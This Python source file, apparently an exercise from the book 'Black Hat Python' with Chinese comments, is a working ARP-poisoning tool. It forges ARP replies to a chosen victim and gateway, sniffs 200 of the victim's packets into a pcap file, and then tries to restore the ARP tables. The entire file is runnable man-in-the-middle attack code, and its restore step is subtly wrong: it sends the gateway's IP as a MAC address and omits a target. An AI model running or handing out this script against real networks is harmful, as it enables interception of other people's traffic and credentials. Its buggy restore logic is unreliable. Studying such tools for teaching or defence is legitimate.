#!/usr/bin/env python
# encoding: utf-8
"""
@file: arper.py
@time: 2022/5/23 21:18
@project: black-hat-python-2ed
@desc: P70 ARP投毒
"""
import sys
import time

from scapy.config import conf
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp, sniff, send
from multiprocessing import Process

from scapy.utils import wrpcap


def get_mac(target_ip):
    """
    获取设备的MAC地址
    :param target_ip:
    :return:
    """
    # 创建一个查询数据包，数据包将会被全网广播
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", pdst=target_ip)
    # 发送数据包
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None


class Arper:
    def __init__(self, victim, gateway, interface="en0"):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f"Initialized {interface}:")
        print(f"Gateway ({gateway}) is at {self.gatewaymac}.")
        print(f"Victim ({victim}) is at {self.victimmac}.")
        print("-" * 30)

    def run(self):
        # 毒害ARP缓存
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        # 嗅探网络流量、实时监控攻击过程
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        """
        投毒
        :return:
        """
        # 构建受害者的恶意ARP数据包
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f"ip src: {poison_victim.psrc}")
        print(f"ip dst: {poison_victim.pdst}")
        print(f"mac dst: {poison_victim.hwdst}")
        print(f"mac src: {poison_victim.hwsrc}")
        print("-" * 30)
        # 构建毒害网关的恶意ARP数据包
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f"ip src: {poison_gateway.psrc}")
        print(f"ip dst: {poison_gateway.pdst}")
        print(f"mac dst: {poison_gateway.hwdst}")
        print(f"mac src: {poison_gateway.hwsrc}")
        print(poison_gateway.summary())
        print("-" * 30)
        print(f"Beginning the ARP poison. [CTRL-C to stop]")
        # 循环发送恶意数据包
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                # 将网络状态恢复到原样（把正确信息发送给受害者和网关，还原投毒攻击前的状态）
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count=200):
        """
        嗅探
        :param count:
        :return:
        """
        # 给投毒线程留下足够的时间
        time.sleep(5)
        print(f"Sniffing {count} packets")
        # 只嗅探受害者IP的数据包
        bpf_filter = "ip host %s" % victim
        # 指定嗅探的个数
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        # 将这些数据包存在arper.pcap文件中
        wrpcap("arper.pcap", packets)
        print("Got the packets")
        # 将ARP表中的数据还原为原来的值
        self.restore()
        self.poison_thread.terminate()
        print("Finished.")

    def restore(self):
        """
        网络设置（给受害者和网关发送正确的ARP信息，恢复为原来的状态）
        :return:
        """
        print("Restoring ARP tables...")
        # 把网关原本的IP地址和MAC地址发给受害者
        send(ARP(op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst="ff:ff:ff:ff:ff:ff"), count=5)
        # 把受害者原本的IP地址和MAC地址发给网关
        send(ARP(op=2, psrc=self.victim, hwsrc=self.gateway, hwdst="ff:ff:ff:ff:ff:ff"), count=5)


if __name__ == '__main__':
    (victim, gateway, interfact) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interfact)
    myarp.run()
